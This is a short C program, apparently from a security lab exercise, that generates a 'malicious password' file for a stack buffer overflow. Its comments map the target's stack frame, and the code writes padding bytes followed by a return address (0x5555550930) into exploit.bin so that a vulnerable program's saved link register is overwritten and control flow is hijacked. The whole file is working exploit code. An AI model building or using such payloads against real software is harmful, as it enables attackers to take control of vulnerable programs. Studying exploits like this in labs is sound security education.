// generate a malicious password to
// perform a buffer overflow attack

/*
 * need to put 0x0000005555550930 into the backed 
 * up LR value for main's staavk frame
 * 
 * 12 bytes for password
 * 4 bytes of padding 
 * 8 bytes for main's backed up fp
 * 8 bytes for main's lr
 */

#include <stdio.h>
int main() {
    char buff[] = {
        0, 0, 0, 0, 0, 0, 0, 0,         // password bytes 0-7
        0, 0, 0, 0, 0, 0, 0, 0,         // password bytes 8-11, 4 padding
        0, 0, 0, 0, 0, 0, 0, 0,         // fp
        0x30, 0x09, 0x55, 0x55, 0x55, 0, 0, 0   // lr
    };

    FILE *fp = fopen("exploit.bin", "wb");
    // buffer, size of buffer, how many times, file
    fwrite(buff, sizeof(buff), 1, fp);
    fclose(fp);
}